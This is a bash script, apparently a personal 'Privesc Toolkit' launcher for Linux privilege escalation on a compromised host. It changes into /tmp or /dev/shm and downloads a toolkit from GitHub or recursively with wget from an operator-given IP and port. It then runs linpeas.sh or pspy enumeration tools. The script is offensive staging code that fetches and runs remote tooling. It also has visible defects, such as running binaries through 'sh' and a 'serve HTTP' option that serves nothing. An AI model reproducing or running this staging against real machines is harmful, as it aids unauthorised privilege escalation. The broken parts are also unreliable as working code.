#!/bin/bash

echo '[+] Privesc Toolkit'
echo
echo '[+] 1) Download from Github'
echo '[+] 2) Download from <ip> and <port>'
echo ''
read choice1
echo
echo '[+] 1) Destination : /tmp'
echo '[+] 2) Destination : /dev/shm'
echo ''
read choice2
echo

if [ $choice2 -eq "1" ];then
	echo '[+] Going into /tmp'
	cd /tmp
else
	echo '[+] Going into /dev/shm'
	cd /dev/shm
fi

if [ $choice1 -eq "1" ]; then
	echo '[+] Cloning the repo'
	git clone https://github.com/ech1/PrivescTK
	cd PrivescTK
else
	echo 'ip ?'
	read ip
	echo

	echo 'port ?'
	read port
	echo

	#wget -R http://$ip$port ###############
	echo "[+] Cloning from http://$ip:$port"
	wget -r -npH -R "index.html*" http://$ip:$port/PrivescTK/
	cd PrivescTK
fi




echo '[+] 0) Serve HTTP service'
echo '[+] 1) linpeas.sh'
echo '[+] 2) pspy64'
echo '[+] 3) pspy32'
echo '[+] 4) pspy64s'
echo '[+] 5) pspy32s'
echo ''
read choice3

case "$choice3" in
"1")
	sh scripts/linpeas.sh
	;;
"2")
	sh scripts/pspy64
	;;
"3")
	sh scripts/pspy32
	;;
"4")
	sh scripts/pspy64s
	;;
"5")
	sh scripts/pspy32s
	;;
*)
	echo '[+] Invalid'
	;;
esac




if [ $choice3 -eq "0" ]; then
	echo '[+] Here are the available ips:'
	ip a | grep inet | cut -d ' ' -f6
	echo '[+] which port ?'
	read portnumber
fi
